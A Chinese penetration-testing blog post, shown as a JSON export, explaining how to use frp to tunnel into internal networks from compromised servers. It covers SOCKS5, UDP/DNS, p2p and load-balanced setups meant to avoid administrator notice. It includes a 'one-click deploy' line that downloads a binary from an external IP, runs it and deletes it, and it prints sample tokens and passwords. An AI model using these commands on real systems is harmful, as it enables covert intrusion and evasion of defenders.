{"title":"Frp实现网络的内外穿透","slug":"网安大类/PenetrationNote/持续维权/内网穿透/Frp实现网络的内外穿透","date":"2019-12-30T09:36:30.000Z","updated":"2023-01-31T02:29:10.674Z","url":"2019/12-30-404.html","path":"api/articles/2019/12-30-404.html.json","covers":["https://img.weiyigeek.top/2019/1/20191230222637188.png","https://img.weiyigeek.top/2019/1/20191231102335.png","https://img.weiyigeek.top/2019/1/20191231105716.png","https://img.weiyigeek.top/2019/1/20191230155444.png"],"content":"<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言介绍\"><a href=\"#0x00-前言介绍\" class=\"headerlink\" title=\"0x00 前言介绍\"></a>0x00 前言介绍</h4><p>在没有Frp穿透开源出来的时候，链接远程网络通常是采用向日葵或者TeamViewer，并且在做渗透测试的时候面对的目标常常是处于内网之中;在以往的渗透中拿到了服务器权限后，个人最常使用的内网代理方式是 <code>reGeorg + Proxifier/proxychains</code>，虽然是脚本代理的方式，但使用快捷方便，能够迅速访问到内部网;但是但是随着目标内网环境越来越大，这种脚本形式代理的局限性越来越明显；</p>\n<p>描述:frp 是一个可用于内网穿透的高性能的反向代理应用(采用Go语言进行开发)，支持 tcp, udp ,stcp协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透;</p>\n<p>Frp项目地址:<a href=\"https://github.com/fatedier/frp\" target=\"_blank\" rel=\"noopener\">https://github.com/fatedier/frp</a></p>\n<p>应用场景:满足通过公网服务器访问处于内网的服务，如访问内网web服务，远程ssh内网服务器，远程控制内网NAS,流量转发等，实现类似花生壳、ngrok等功能;</p>\n<p>Frp工具有两端CS架构:</p>\n<ul>\n<li>服务端：服务端部署在我们具有公网IP的服务器上;</li>\n<li>客户端：客户端放在我们内网的服务器上;</li>\n</ul>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20191230222637188.png\" alt=\"WeiyiGeek.20191230222637188\" title=\"\" class=\"\">\n                <p>WeiyiGeek.20191230222637188</p>\n            </figure>\n<p>注意事项:</p>\n<ul>\n<li>Windows与Linux启动Frps/c的不同的是，Windows默认启动frps的配置文件绑定的端口是7000，而frpc默认启动的配置文件是frpc.ini；</li>\n</ul>\n<p><br></p>\n<h4 id=\"0x01-安装使用\"><a href=\"#0x01-安装使用\" class=\"headerlink\" title=\"0x01 安装使用\"></a>0x01 安装使用</h4><p>描述:到下载Frp的relases页面选择跨平台，实战中根据目标机版本选择下载：<a href=\"https://github.com/fatedier/frp/releases\" target=\"_blank\" rel=\"noopener\">https://github.com/fatedier/frp/releases</a>;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#以服务端为例</span></span><br><span class=\"line\">wget https://github.com/fatedier/frp/releases/download/v0.30.0/frp_0.30.0_linux_amd64.tar.gz</span><br><span class=\"line\">tar -zxf frp_0.30.0_linux_amd64.tar.gz -C ./frp_0.30.0 --strip-components 1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$vim</span> ./frp_0.30.0/frps.ini <span class=\"comment\">#开启服务端web页面，服务端配置为：</span></span><br><span class=\"line\"></span><br><span class=\"line\">[common]</span><br><span class=\"line\">bind_addr = 0.0.0.0</span><br><span class=\"line\">bind_port = 7000</span><br><span class=\"line\">tls_enable = <span class=\"literal\">true</span></span><br><span class=\"line\">pool_count = 5</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># IP 与 bind_addr 默认相同，可以不设置</span></span><br><span class=\"line\"><span class=\"comment\"># dashboard_addr = 0.0.0.0</span></span><br><span class=\"line\"><span class=\"comment\"># 端口必须设置，只有设置web页面才生效</span></span><br><span class=\"line\">dashboard_port = 7500</span><br><span class=\"line\"><span class=\"comment\"># 用户密码保平安</span></span><br><span class=\"line\">dashboard_user = WeiyiGeek</span><br><span class=\"line\">dashboard_pwd = WeiyiGeek@Kp9eG1xzyYS</span><br><span class=\"line\"><span class=\"comment\"># Token 防止其它客户端链接</span></span><br><span class=\"line\">token = X758@WeiyiGeek</span><br><span class=\"line\"><span class=\"comment\"># 允许客户端绑定的端口</span></span><br><span class=\"line\">allow_ports = 40000-50000</span><br></pre></td></tr></table></figure>\n<p>基础命令:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./frps -c ./frps.ini –reload  <span class=\"comment\">#热加载 </span></span><br><span class=\"line\">nohup ./frps -c ./frps.ini &amp;  <span class=\"comment\">#后台启动</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#验证启动</span></span><br><span class=\"line\"><span class=\"variable\">$ps</span> aux | grep <span class=\"string\">\"frp\"</span></span><br><span class=\"line\">root      2174  0.6  0.4 114436 18460 pts/0    Sl   17:31   0:00 ./frps -c frps.ini</span><br></pre></td></tr></table></figure>\n<hr>\n\n<h4 id=\"0x02-内网穿透\"><a href=\"#0x02-内网穿透\" class=\"headerlink\" title=\"0x02 内网穿透\"></a>0x02 内网穿透</h4><h5 id=\"1-Socket代理转发\"><a href=\"#1-Socket代理转发\" class=\"headerlink\" title=\"1.Socket代理转发\"></a>1.Socket代理转发</h5><p>描述:首先最简单常用的就是socks协议代理这一功能在 frp 中是以插件的形式实现的;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#使用插件socks5代理</span></span><br><span class=\"line\">[socket5]</span><br><span class=\"line\"><span class=\"built_in\">type</span>=tcp</span><br><span class=\"line\">remote_port = 9080</span><br><span class=\"line\">plugin = socks5</span><br><span class=\"line\"><span class=\"comment\">#socks5连接口令 [根据实际情况进行配置]</span></span><br><span class=\"line\"><span class=\"comment\">#plugin_user = WeiyiGeek</span></span><br><span class=\"line\"><span class=\"comment\">#plugin_passwd = weiye</span></span><br><span class=\"line\">use_encryption = <span class=\"literal\">true</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#或者直接写客户端配置文件</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">\"[common]\\nserver_addr = 127.0.0.1\\nserver_port = 7000\\ntls_enable = true\\npool_count = 5\\n\\n[plugin_socks]\\ntype = tcp\\nremote_port = 46075\\nplugin = socks5\\nplugin_user = joseph\\nplugin_passwd = bnbm#yBZ90ad\\nuse_encryption = true\\nuse_compression = true\"</span> &gt; delphi.ini</span><br><span class=\"line\"><span class=\"comment\"># 启动</span></span><br><span class=\"line\">nohup ./deamon -c delphi.ini &amp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#一键部署</span></span><br><span class=\"line\">wget http://103.242.135.137/3Edsr9I &gt;/dev/null 2&gt;&amp;1 &amp;&amp; chmod +x 3Edsr9I &amp;&amp; ./3Edsr9I &amp;&amp; rm -rf 3Edsr9I</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h5 id=\"2-UDP协议代理\"><a href=\"#2-UDP协议代理\" class=\"headerlink\" title=\"2.UDP协议代理\"></a>2.UDP协议代理</h5><p>描述:frp 也同时能够对 UDP 协议进行转发，配置上与 tcp 也是差不多的，基本上就是端口转发(没难度),对于UDP协议的测试我们使用比较常见的<code>SNMP协议和DNS协议</code>来测试;<br>思路：</p>\n<ul>\n<li>在做渗透测试的时候有时候会遇到打印机以及其它采用snmp通讯的设备,我们可以<code>通过 snmp 协议和 惠普的 pjl 来获得敏感信息</code>,通过 frp 隧道对公司内网打印机 10.10.65.9 进行攻击，使用的是<code>打印机攻击框架 PRET 简单的打印一个文档</code>;</li>\n<li>得到一台内网机器的权限后，通过扫描53端口或者其它手段找到内网的DNS服务器,接下来我们将DNS解析到指定内网服务器上，因此我们就可以通过域名访问内网服务器，也可以指定 DNS 服务器进行子域名爆破来发现更多的资产；<code>首先对内目标网段的 53 端口进行扫描探测，扫描端口使用 TCP 协议就可以，所以先使用原先的代理扫描，</code></li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[dns]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = udp</span><br><span class=\"line\">local_ip = 10.10.100.132</span><br><span class=\"line\">local_port = 53</span><br><span class=\"line\">remote_port = 40053</span><br><span class=\"line\">use_encryption = <span class=\"literal\">true</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#使用 dig 命令测试一下对 www.baidu.com 的解析，可以看得到域名成功解析到我们设定ip则内网代理成功，您也可以采用Python进行轮寻查询</span></span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20191231102335.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<h5 id=\"3-点对点stcp与xtcp\"><a href=\"#3-点对点stcp与xtcp\" class=\"headerlink\" title=\"3.点对点stcp与xtcp\"></a>3.点对点stcp与xtcp</h5><p>描述:安全地暴露内网服务（secret tcp）以及 xtcp 都是frp提供的点对点传输服务;</p>\n<ul>\n<li>xtcp:用于应对在希望传输大量数据且流量不经过服务器的场景,直接是一个 p2p 的隧道，frp 所谓的 xtcp 协议底层应该是 UDP 打洞的过程;<ul>\n<li>根据官方文档这种协议不能穿透所有类型的 NAT 设备，所以穿透成功率较低，穿透失败时可以尝试 stcp 的方式</li>\n</ul>\n</li>\n<li>stcp:相当于再添加一次认证，改一次配置文件即可<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Client 1(被入侵的服务器)</span></span><br><span class=\"line\">[p2p_socks]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = xtcp</span><br><span class=\"line\">remote_port = 46075</span><br><span class=\"line\">sk = HjnllUwX5WiRD5Ij</span><br><span class=\"line\">plugin = socks5</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Client 2(攻击者) - 相当于接受Server转发</span></span><br><span class=\"line\">[p2p_socks_visitor]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = xtcp</span><br><span class=\"line\">role = visitor</span><br><span class=\"line\">server_name = p2p_socks</span><br><span class=\"line\">sk = HjnllUwX5WiRD5Ij</span><br><span class=\"line\">bind_addr = 127.0.0.1</span><br><span class=\"line\">bind_port = 1086</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>流程说明:</p>\n<ul>\n<li>甲 <-> 公 <-> 乙 :记录客户端甲和乙的 IP 和端口信息，但是IP和端口并非甲和乙在内网的IP(外网)和随机端口，而是通过NAT方式映射到路由器上的IP和端口。</li>\n<li>客户端甲向服务器发送udp消息，请求和客户端乙通信。</li>\n<li>服务器向客户端甲发送消息，消息内容包含客户端乙的IP和端口信息。</li>\n<li>服务器向客户端乙发送消息，消息内容包含客户端甲的IP和端口信息。</li>\n<li>客户端甲根据3步骤获得的信息向客户端乙发送udp消息，同一时刻客户端乙根据3步骤获得的信息向客户端甲发送udp消息(尝试多次udp打洞就能成功)</li>\n</ul>\n<p>注意事项:</p>\n<ul>\n<li>该打洞方案只支持 ConeNAT（锥形 NAT），不支持 Symmetric NAT （对称NAT）因此没办法能够支持全部的 NAT方式，更何况，你知道你在访问公网的时候中间经过了多少层 NAT 吗？</li>\n</ul>\n<p><br></p>\n<h5 id=\"4-负载均衡\"><a href=\"#4-负载均衡\" class=\"headerlink\" title=\"4.负载均衡\"></a>4.负载均衡</h5><p>描述:在内网拿到了多台能够访问互联网机器，可以启用多台客户端进行负载均衡，毕竟突然从一台机器迸发出大量流量很容易引起管理员的注意，也可以负载分担一下机器的CPU资源消耗;</p>\n<p>比如:使用两台被入侵的服务器作为负载均衡，IP分别为 10.10.99.33 和 10.10.100.81<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Client 1/2 部分相同的点是 group/group_key/remote_port</span></span><br><span class=\"line\">[common]</span><br><span class=\"line\"><span class=\"comment\"># 远程VPS地址</span></span><br><span class=\"line\">server_addr = 103.242.135.137</span><br><span class=\"line\">server_port = 7000</span><br><span class=\"line\">tls_enable = <span class=\"literal\">true</span></span><br><span class=\"line\">pool_count = 5</span><br><span class=\"line\"></span><br><span class=\"line\">[plugin_socks]</span><br><span class=\"line\"><span class=\"comment\"># [plugin_socks_2]</span></span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">remote_port = 46075</span><br><span class=\"line\">plugin = socks5</span><br><span class=\"line\">plugin_user = joseph</span><br><span class=\"line\">plugin_passwd = bnbm<span class=\"comment\">#yBZ90ad</span></span><br><span class=\"line\">use_encryption = <span class=\"literal\">true</span></span><br><span class=\"line\">use_compression = <span class=\"literal\">true</span></span><br><span class=\"line\">group = socks_balancing</span><br><span class=\"line\">group_key = NGbB5<span class=\"comment\">#8n</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20191231105716.png\" alt=\"WeiyiGeek.负载均衡Group\" title=\"\" class=\"\">\n                <p>WeiyiGeek.负载均衡Group</p>\n            </figure>\n<p><br></p>\n<h5 id=\"5-其它功能\"><a href=\"#5-其它功能\" class=\"headerlink\" title=\"5.其它功能\"></a>5.其它功能</h5><ul>\n<li>转发 Unix 域套接字：单个主机通信协议一般用不上</li>\n<li>对外提供文件访问服务：这估计是渗透测试工程师最不需要的功能</li>\n<li>http转https：没用</li>\n<li>加密与压缩：这两个功能可以看到我都启用了</li>\n<li>TLS加密：这个我也开了，安全性更高</li>\n<li>客户端UI/热加载配置/查看状态：普通情况下是可以不用的，但是前期资产发现过程需要多次配置的情况，或者上线新机器做负载均衡的时候可以使用，不过热加载还是需要等一段时间才能够生效，性子急的我表示等不了</li>\n<li>端口白名单：这里我指定了 40000-50000</li>\n<li>web相关的：很多功能是为了将内网web转至公网</li>\n<li>通过代理连接 frps：在特殊情况下可能是有用的，但是暂时没用</li>\n<li>范围端口映射：这个貌似也没什么用</li>\n<li>子域名：在找到内网DNS解析服务器的情况下可以不进行配置，如果没找到，但是知道内网 IP 和域名的对应关系，且服务器只可以通过域名访问的情况下可以使用这项配置，但我觉得都不如绑个host来的快</li>\n<li>KCP协议：KCP是一个快速可靠协议，能以比 TCP浪费10%-20%的带宽的代价，换取平均延迟降低 30%-40%，且最大延迟降低三倍的传输效果，在带宽很足但延迟较高的情况下可以使用 kcp 协议进行数据通信，未测试</li>\n</ul>\n<hr>\n\n<h4 id=\"0x03-基础配置说明\"><a href=\"#0x03-基础配置说明\" class=\"headerlink\" title=\"0x03 基础配置说明\"></a>0x03 基础配置说明</h4><p>描述:主要正对于Frps服务端和客户端进行配置文件的说明;</p>\n<ol>\n<li>服务端：<em><a href=\"https://github.com/fatedier/frp/blob/master/conf/frps_full.ini\" target=\"_blank\" rel=\"noopener\">https://github.com/fatedier/frp/blob/master/conf/frps_full.ini</a></em></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [common] 通用基础参数</span></span><br><span class=\"line\">[common]</span><br><span class=\"line\"><span class=\"comment\"># Frps服务器端开放的端口</span></span><br><span class=\"line\"><span class=\"comment\"># ipv6的文本地址或主机名必须括在方括号中 如\"[::1]:80\"</span></span><br><span class=\"line\">bind_addr = 0.0.0.0</span><br><span class=\"line\">bind_port = 7000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 双方验证token当一致时候进行绑定通讯</span></span><br><span class=\"line\">token = token12345678</span><br><span class=\"line\"><span class=\"comment\"># 允许 frpc(客户端) 绑定的端口，不设置的情况下没有限制</span></span><br><span class=\"line\">allow_ports = 2000-3000,3001,3003,4000-50000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#启用特权模式，从v0.10.0版本开始默认启用特权模式 [特权模式下，客户端更改配置无需更新服务端]</span></span><br><span class=\"line\">privilege_mode = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\">#特权模式Token [强口令，建议随机生成]</span></span><br><span class=\"line\">privilege_token = kukezkHC8R1H</span><br><span class=\"line\"><span class=\"comment\">#特权模式允许分配的端口 [避免端口被滥用]</span></span><br><span class=\"line\">privilege_allow_ports = 4000-50000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果超过最大值，每个代理中的 pool_count 将更改为 max_pool_count</span></span><br><span class=\"line\">max_pool_count = 5</span><br><span class=\"line\"><span class=\"comment\"># 每个客户端可以使用最大端口数，默认值为0，表示没有限制</span></span><br><span class=\"line\">max_ports_per_client = 0</span><br><span class=\"line\"><span class=\"comment\"># 是否使用 tcp 流多路复用，默认值为 true （C与S一致才行）</span></span><br><span class=\"line\">tcp_mux = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 心跳检测超时时长</span></span><br><span class=\"line\">heartbeat_timeout = 30</span><br><span class=\"line\"><span class=\"comment\"># 口令认证超时时间，一般不用改</span></span><br><span class=\"line\">authentication_timeout = 900</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># udp端口帮助使udp漏洞穿透nat</span></span><br><span class=\"line\"><span class=\"comment\"># bind_udp_port = 7001</span></span><br><span class=\"line\"><span class=\"comment\"># udp端口用于kcp协议，它可以与'bind_port'相同 ，如果没有设置kcp在frps中是禁用的</span></span><br><span class=\"line\"><span class=\"comment\"># kcp_bind_port = 7000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置 dashboard_addr 和 dashboard_port 用于查看 frps 仪表盘,注意只有 dashboard_port 被设定仪表盘才能生效</span></span><br><span class=\"line\"><span class=\"comment\"># IP 与 bind_addr 默认相同，可以不设置</span></span><br><span class=\"line\"><span class=\"comment\"># dashboard_addr = 0.0.0.0</span></span><br><span class=\"line\">dashboard_port = 7500</span><br><span class=\"line\"><span class=\"comment\">#设置仪表盘用户密码，用于基础认证保护，默认为 admin/admin</span></span><br><span class=\"line\">dashboard_user = admin</span><br><span class=\"line\">dashboard_pwd = admin</span><br><span class=\"line\"><span class=\"comment\"># 指示板资产目录(仅用于调试模式)</span></span><br><span class=\"line\"><span class=\"comment\"># assets_dir = ./static</span></span><br><span class=\"line\"><span class=\"comment\"># 对 http 请求设置自定义 404 页面</span></span><br><span class=\"line\"><span class=\"comment\"># custom_404_page = /path/to/404.html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 指定哪个地址代理将监听，默认值与bind_addr相同</span></span><br><span class=\"line\"><span class=\"comment\"># proxy_bind_addr = 127.0.0.1</span></span><br><span class=\"line\"><span class=\"comment\"># 代理名, 使用 ',' 分隔 ；默认为空, 表示全部代理</span></span><br><span class=\"line\"><span class=\"comment\"># start = ssh,dns</span></span><br><span class=\"line\"><span class=\"comment\"># 在此处设置用户名后，代理名称将设置为  &#123;用户名&#125;.&#123;代理名&#125;</span></span><br><span class=\"line\"><span class=\"comment\"># user = your_name</span></span><br><span class=\"line\"><span class=\"comment\"># pass = your_pass</span></span><br><span class=\"line\"><span class=\"comment\"># 如果要通过 http 代理或 socks5 代理连接 frps，可以在此处或全局代理中设置 http_proxy 只支持 tcp协议</span></span><br><span class=\"line\">http_proxy = http://user:passwd@192.168.1.128:8080</span><br><span class=\"line\">http_proxy = socks5://user:passwd@192.168.1.128:1080</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果 subdomain_host 不为空, 可以在客户端配置文件中设置子域名类型为 http 还是 https 当子域名为 test 时, 用于路由的主机为 test.frps.com</span></span><br><span class=\"line\"><span class=\"comment\"># 指定子域名，后续将全部用域名的形式进行访问 [特权模式需下将 *.xxxx.online 解析到外网VPS上，即域名泛解析]</span></span><br><span class=\"line\">subdomain_host = frps.com</span><br><span class=\"line\"><span class=\"comment\"># 如果你想支持虚拟主机，你必须设置http监听端口(可选)</span></span><br><span class=\"line\"><span class=\"comment\"># 注意:http端口和https端口可以与bind_port相同</span></span><br><span class=\"line\"><span class=\"comment\"># vhost_http_port = 80</span></span><br><span class=\"line\"><span class=\"comment\"># vhost_https_port = 443</span></span><br><span class=\"line\"><span class=\"comment\"># 虚拟 http 服务器的响应头超时时间（秒），默认值为60s</span></span><br><span class=\"line\"><span class=\"comment\"># vhost_http_timeout = 60</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 控制台或真实日志文件路径，如./frps.log</span></span><br><span class=\"line\">log_file = ./frpc.log</span><br><span class=\"line\"><span class=\"comment\"># 日志级别分为trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误）</span></span><br><span class=\"line\">log_level = info</span><br><span class=\"line\"><span class=\"comment\"># 最大日志记录天数</span></span><br><span class=\"line\">log_max_days = 3</span><br><span class=\"line\"><span class=\"comment\"># 当log_file为控制台时禁用日志颜色，默认为false</span></span><br><span class=\"line\">disable_log_color = <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>客户端:</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span 